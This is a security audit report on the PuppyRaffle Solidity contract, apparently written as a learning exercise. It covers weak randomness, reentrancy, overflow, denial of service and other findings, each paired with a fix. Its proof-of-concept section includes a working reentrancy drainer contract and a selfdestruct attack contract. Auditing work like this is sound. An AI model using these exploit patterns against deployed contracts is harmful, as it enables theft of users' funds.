![](logo.png) 
![](./img/puppy-raffle.png)

# Security Report for the PuppyRaffle CodeHawks FirstFlight Contest **learning*

**Source:** https://github.com/Cyfrin/2023-10-Puppy-Raffle

--------------------------------------------

## High Issues

### [H-1] Weak randomness in `PuppyRaffle::selectWinner()` allows malicious users to influence or predict the winner as well as the winning puppy

#### Description:

Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable final number. A predictable number goes against the idea of randomness. malicious users can manipulate these values or know them ahead of time to choose the winner for themselves.

*Note:* This additionally means malicious users can front-run this function and call `refund` if they see they are not the winner.

#### Impact:

Malicious user can influence the winner of the raffle, thus winning money and selecting the `rarest` puppy NFT.

#### Proof Of Concept:

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use these to predict when/how to participate.
2. Malicious users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
3. Malicious users can revert their `selectWinner()` transactions if the they don't like the winner or resulting puppy NFT.

#### Tools Used:

- Foundry
- Slither

#### Recommended Mitigation:

Use [Chainlink `VRF`](https://docs.chain.link/vrf) to handle random number generation.

---------------------------------------------------

### [H-2] Risk of Reentrancy in `PuppyRaffle::refund()` function

#### Description:

<details>
<summary>Found Instance</summary>

- The `PuppyRaffle::refund()` can be re-entered because it does not follow the `CEI` (Checks-Effects-Interactions) pattern. Basically, interaction(s) with an external account is made before effects(state is updated).

    ```solidity
        /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
        /// @dev This function will allow there to be blank spots in the array
        function refund(uint256 playerIndex) public {
            address playerAddress = players[playerIndex];
            // checks 👇🏾
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            // interaction 👇🏾
            payable(msg.sender).sendValue(entranceFee);

            // effects (state updates) 👇🏾
            players[playerIndex] = address(0);

            emit RaffleRefunded(playerAddress);
        }
    ```

</details>

#### Impact:

If the caller of the `PuppyRaffle::refund()` function is a malicious contract with a `receive()` function, then the `PuppyRaffle::refund()` function can be re-entered before the state is updated. All fees paid by raffle entrants can then be stolen by the malicious contract.

#### Proof Of Concept:

Create a `Hunter` contract 👇🏾:

<details>
<summary>Hunter</summary>

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.7.6;

    import {PuppyRaffle} from "./PuppyRaffle.sol";

    contract Hunter {
        PuppyRaffle puppy;
        address hunter = address(this);

        constructor(PuppyRaffle _puppy) {
            puppy = _puppy;
        }

        function poach() public payable {
            require(msg.value == puppy.entranceFee());

            // create a dynamic array, and push the Hunter's address
            address[] memory players = new address[](1);
            players[0] = hunter; // address(this) is the address of this contract, which is the Hunter contract

            // enter raffle
            puppy.enterRaffle{value: msg.value}(players);

            // find index of the Hunter's address
            uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);

            // refund hunter
            puppy.refund(hunterIndex);
        }

        receive() external payable {
            // find index of the Hunter's address
            uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);

            if (address(puppy).balance >= 1e18) {
                puppy.refund(hunterIndex);
            }
        }
    }

```

</details>

Modify `PuppyRaffleTest.t.sol` test contract 👇🏾:
  
<details>
<summary>PuppyRaffleTest</summary>

````diff
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.7.6;
    pragma experimental ABIEncoderV2;

    import {Test, console} from "forge-std/Test.sol";
    import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+   import {Hunter} from "../src/Hunter.sol";

    contract PuppyRaffleTest is Test {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee = 1e18;
        address playerOne = address(1);
        address playerTwo = address(2);
        address playerThree = address(3);
        address playerFour = address(4);
        address feeAddress = address(99);
        uint256 duration = 1 days;

+       Hunter hunter;

        function setUp() public {
            puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
+           hunter = new Hunter(puppyRaffle);
        }
    }
````
</details>

Add the following test 👇🏾:

<details>
<summary>Code</summary>

```solidity
    function testHunterReentrancyAttackSuccessful() public {
        address[] memory players = new address[](5);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        players[4] = address(hunter);
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);

        console.log(address(puppyRaffle).balance);
        assert(address(puppyRaffle).balance == 5e18);

        // attack logic
        uint256 hunterIndex = puppyRaffle.getActivePlayerIndex(address(hunter));
        // hunter attacks
        vm.prank(address(hunter));
        puppyRaffle.refund(hunterIndex);

        // assert PuppyRaffle's contract has been drained
        assert(address(puppyRaffle).balance == 0);
        // assert Hunter's balance has increased more than expected
        assert(address(hunter).balance == 5e18);
    }
```

</details>

#### Tools Used:

- Foundry
- Slither
- Manual Review
- Remix
- Chat GPT

#### Recommended Mitigation:

Re-arrange the `PuppyRaffle:refund()` fund to follow `CEI` pattern:

<details>
<summary>Code</summary>

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // Update state before sending Ether
        players[playerIndex] = address(0);

        // Now transfer the refund
        payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
    }
```

</details>

Also the `nonReentrant` modifier from [OpenZeppelin `ReentrancyGuard`](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) could be used.

----------------------------------------------------

### [H-3] Integer overflow of `PuppyRaffle::totalFees` leads to loss of fees

#### Description:

In solidity versions prior to `0.8.0`, integers are subject to integer overflow

```solidity
    uint64 maxValue = type(uint64).max
    <!-- 18446744073709551615 -->

    maxValue = maxValue + 1
    <!-- maxValue will be 0 -->
```

#### Impact:

In `PuppyRaffle::selectWinner()`, `totalFees` are accumulated to be sent to the `feeAddress` in the PuppyRaffle::withdrawFees()` function. However if the `totalFees` overflows, the correct amount will not be sent to the `feeAddress`, thus leaving fees permanently stuck in the contract.

#### Proof Of Concept:

1. We conclude a 4 players and then collect fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:

    ```solidity
        totalFees = totalFees + uint64(fee);
        <!-- substituted -->
        totalFees = 800000000000000000 + 17800000000000000000;
        <!-- due to overflow, we get the following result as `totalFees` -->
        totalFees = 153255926290448384;
    ```

<details><summary>Code</summary>

```solidity
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

#### Tools Used:

- Foundry

#### Recommended Mitigation:

Here are a few recommended mitigations:

- Use a newer version of Solidity that does not allow integer overflow by default.

```diff
-        pragma solidity ^0.7.6;
+        pragma solidity ^0.8.0;
```

- If there is an insistence on using an older version of Solidity, a library like `OpenZeppelin's SafeMath` should be used to prevent integer overflow.
- Use a `uint256` instead of a `uint64` for `totalFees`

```diff
-    uint64 public totalFees = 0;
+    uint256 public totalFees = 0;
```
---------------------------------------------------

### [H-4] Mishandling of ETH in `PuppyRaffle::withdrawFees()`

#### Description:

This line in the `PuppyRaffle::withdrawFees()` function;

```solidity
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

mishandles ETH.

#### Impact:

If anyone sends money to the `PuppyRaffle` contract without calling the `PuppyRaffle::enterRaffle()` function, it will be impossible to withdraw fees because the `totalFees` is no longer equal to the balance of the contract.

#### Proof Of Concept:

<details><summary>Code</summary>

- Create this `Attack` contract:

    ```solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.7.6;

        import {PuppyRaffle} from "./PuppyRaffle.sol";

        contract Attack {
            PuppyRaffle puppyRaffle;

            constructor(PuppyRaffle _puppyRaffle) payable {
                puppyRaffle = _puppyRaffle;
            }

            function attack() external payable {
                selfdestruct(payable(address(puppyRaffle)));
            }
        }
    ```

- Then here is a test proving a successful attack:

    ```solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.7.6;
        pragma experimental ABIEncoderV2;

        import {Test, console} from "forge-std/Test.sol";
        import {PuppyRaffle} from "../src/PuppyRaffle.sol";
        import {Attack} from "../src/Attack.sol";

        contract AttackTest is Test {
            PuppyRaffle puppyRaffle;
            Attack attack;

            uint256 entranceFee = 1e18;
            address playerOne = address(1);
            address playerTwo = address(2);
            address playerThree = address(3);
            address playerFour = address(4);
            address feeAddress = address(99);
            uint256 duration = 1 days;

            function setUp() public {
                puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
                attack = new Attack(puppyRaffle);

                vm.deal(address(attack), 1e18); // Fund attacker
            }

            function testETHMishandling() public {
                // Enter players into raffle
                address[] memory players = new address[](4);
                players[0] = playerOne;
                players[1] = playerTwo;
                players[2] = playerThree;
                players[3] = playerFour;
                puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

                uint256 totalFees = address(puppyRaffle).balance;

                assert(totalFees == 4e18);

                // Fast forward
                vm.warp(block.timestamp + duration + 1);
                vm.roll(block.number + 1);

                // Launch ETH mishandling attack with some ETH
                vm.prank(address(attack));
                attack.attack();

                puppyRaffle.selectWinner();
                vm.expectRevert("PuppyRaffle: There are currently players active!");
                puppyRaffle.withdrawFees();
            }
        }
    ```

</details>

#### Tools Used:

- Manual Review
- Foundry

#### Recommended Mitigation:

Refactor the `require` statement in the `PuppyRaffle::withdrawFees()` as so:

```diff
-    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Or remove it entirely.

--- --- --- --- --- --- --- --- --- --- --- ---
--- --- --- --- --- --- --- --- --- --- --- ---

## Medium Issues

### [M-1] Possible DoS attack due to loop through `players` array to check for duplicates in `PuppyRaffle::enterRaffle()` function, thus significant increase in gas costs for future entrants

#### Description:       
The `PuppyRaffle::enterRaffle()` conducts a duplicate address check whenever a new address wants to join the raffle, by looping through the `players` array. This method means that gas costs for performing that transaction (entering the raffle) are significantly cheaper for players who enter at the start of the raffle, and significantly costlier for players who enter the raffle at later stages. Every new player, is an extra `address` the `PuppyRaffle::enterRaffle()` function has to loop through when conducting duplicate address check.

<details>
<summary>Code</summary>

```solidity
        // Check for duplicates
            for (uint256 i = 0; i < players.length - 1; i++) {
                for (uint256 j = i + 1; j < players.length; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            } // @question could there be gas issues that could lead to a DOS attack because of this for loop?
```

</details>

#### Impact:
The gas costs for entering the raffle increases distrubingly as more players enter the raffle. This could cause a rush from players wanting to be one of the first in queue, as well as discourage prospective future players.   
An attacker could make the `PuppyRaffle::entrants`array so large that no other player is able to enter, thus guaranteeing themselves the win.

#### Proof Of Concept:
If there are two sets of players, each set being 500 players large, below is the estimated gas costs:
- First 500 players: ~110091567 gas
- Next 500 players: ~405906812 gas
  
  That is a nearly 4x increase in gas costs for the next 500 players.

  <details>
  <summary>PoC</summary>
  Place the following test into the `PuppyRaffleTest.t.sol` test contract
    
    ```solidity
        function testDOS() public {
            // address[] memory players = new address[](1);
            // players[0] = playerOne;
            // puppyRaffle.enterRaffle{value: entranceFee}(players);
            // assertEq(puppyRaffle.players(0), playerOne);

            vm.txGasPrice(1); // set gas price to 1
            // Let's enter 500 players
            uint256 totalPlayers = 500;
            address[] memory players = new address[](totalPlayers);
            for (uint256 a = 0; a < totalPlayers; a++) {
                players[a] = address(a);
            }

            // gas calculations
            uint256 gasStart = gasleft();

            // enter raffle
            puppyRaffle.enterRaffle{value: entranceFee * totalPlayers}(players);

            // gas calculations
            uint256 gasEnd = gasleft();
            uint256 gasUsedForFirstFiveHundred = (gasStart - gasEnd) * tx.gasprice;
            console.log("The gas cost for the first 500 players is: ", gasUsedForFirstFiveHundred);

            // Let's enter extra 500 players
            // @note the higher the number of extra players you want to add, the more gas this test uses, and at a certain number(say 1000), the enterRaffle() function for the next set of players will fail with a out-of-gas error
            address[] memory playersExtra = new address[](totalPlayers);
            for (uint256 a = 0; a < totalPlayers; a++) {
                playersExtra[a] = address(a + totalPlayers);
                // @note -- the use of address(a + totalPlayers) is so that addresses start from 500+1 (501)
            }
            // gas calculations
            uint256 gasStartExtraPlayers = gasleft();

            // enter raffle for the extra 500 players
            puppyRaffle.enterRaffle{value: entranceFee * totalPlayers}(playersExtra);

            // gas calculations
            uint256 gasEndExtraPlayers = gasleft();
            uint256 gasUsedForNextFiveHundred = (gasStartExtraPlayers - gasEndExtraPlayers) * tx.gasprice;
            console.log("The gas cost for the extra 500 players is: ", gasUsedForNextFiveHundred);

            assert(gasUsedForFirstFiveHundred < gasUsedForNextFiveHundred);
        }
    ```

  </details>

#### Tools Used:
- Manual Review
- Foundry

#### Recommended Mitigation:
 Here are a few recommended mitigations:

- Consider using a `mapping` to check for duplicates. This will allow for constant time look up of whether a user has already entered the raffle.
- Consider allowing duplicate addresses. Especially since users can make new wallet addressess regardles, so a duplicate check doesn't prevent the same person from entering multiple times, omly the same wallet address.
- Alternatively, [OpenZeppelin's `EnumerableSet` Library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet) could be used.

### [M-2] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contract

#### Description:

The `PuppyRaffle::selectWinner()` function is responsible for resetting the lottery. However if the `winner` is a smart contract wallet that rejects payment -due to lack o a `receive` or `fallback` function- , the lottery would not be able to restart.    
Users could easily call the `PuppyRaffle::selectWinner()` function again and non-wallet entrants coud enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

#### Impact:

The `PuppyRaffle::selectWinner()` function could revert many times, making a lottery reset difficult.      
Also, true winners could not get paid out and someone else could take their money!

#### Proof Of Concept:

1. Multiple smart contract wallets without a `receive` or `fallback` function enter the the lottery
2. The lottery ends
3. The `PuppyRaffle::selectWinner()` function won't work even though the lottery is over!

#### Tools Used:

- Manual Review

#### Recommended Mitigation:

- Do not allow smart contract wallet entrants, or
- Create a `mapping` of `addresses => payout` so winners can pull their funds out by themselves with a new `claimPrize()` function, putting the responsibility of prize claiming on the winner.

--- --- --- --- --- --- --- --- --- --- --- ---
--- --- --- --- --- --- --- --- --- --- --- ---

## Low Issues

### [L-1] `PuppyRaffle::getActivePlayerIndex()` returns 0 for both non-existent players as well as player at index 0

#### Description:

The `PuppyRaffle::getActivePlayerIndex()` returns 0 for both non-existent players, as well as any player at index 0.

<details><summary>Found Instance</summary>

```solidity
    /// @notice a way to get the index in the array
    /// @param player the address of a player in the raffle
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

</details>

#### Impact:

This will cause confusion for whichever player is at index 0 in the `PuppyRaffle::players` array as the player will think they have not entered the raffle and then attempt to enter the raffle again. From gas waste to genral confusion or/and panic.

#### Proof Of Concept:

1. User enters raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex()` returns 0
3. User thinks they have not entered correctly due to function documentation

<details><summary>Proof Of Code<summary>

```solidity
    function testGetActivePlayerIndexError() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee * 1}(players);

        uint256 indexOfPlayerOne = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 indexOfNonExistentPlayer = puppyRaffle.getActivePlayerIndex(playerThree);

        assert(indexOfPlayerOne == indexOfNonExistentPlayer);
    }
```

</details>

#### Tools Used:

- Manual Review
- Foundry

#### Recommended Mitigation:

Any of these mitigations would work:

- The easiest mitigation would be for the `PuppyRaffle::getActivePlayerIndex()` function to revert if the player is not an active player, as against returning 0.
- Reserve the 0th position for any competition.
- Return an `int256` such that the `PuppyRaffle::getActivePlayerIndex()` returns `-1` if the player is not active

--- --- --- --- --- --- --- --- --- --- --- ---
--- --- --- --- --- --- --- --- --- --- --- ---

## Gas Issues

### [G-1]: Unchanged state variables should be declared as constant or immutable

Reading from storage is more expensive than reading from a `constant` or `immutable` variable

<details><summary>Found Instances</summary>

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

</details>

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length`, you read from `storage` as opposed to reading from `memory` which is more gas efficint. Therefore all instances of `players.length` should be changed to `playerLength`.

i.e. 

```solidity
    uint256 playerLength = players.length;
```

--- --- --- --- --- --- --- --- --- --- --- ---
--- --- --- --- --- --- --- --- --- --- --- ---

## Informational Issues

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`.

### [I-2] Outdated version of Solidity

Contract uses `0.7.6`, a new version should be used. Preferably `^0.8.0`.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>Found Instances</summary>

- Found in `PuppyRaffle::constructor()`

    ```solidity
        feeAddress = _feeAddress;
    ```

- Found in `PuppyRaffle::changeFeeAddress()`

    ```solidity
        feeAddress = newFeeAddress;
    ```

</details>

### [I-4] Define and use `constant` variables instead of using literals (magic numbers)

For better code readability, refrain from using number literals as much as possible

<details><summary>Found Instances</summary>

- The following:

    ```solidity
        uint256 prizePool = (totalAmountCollected * 80) / 100;
    ```

    ```solidity
        uint256 fee = (totalAmountCollected * 20) / 100;
    ```

- Could become:

    ```solidity
        uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public constant POOL_PRECISION = 100;
    ```

</details>

### [I-5] State changes are missing events as well as indexed events

### [I-6] `PuppyRaffle::_isActivePlayer()` function is never used and should be removed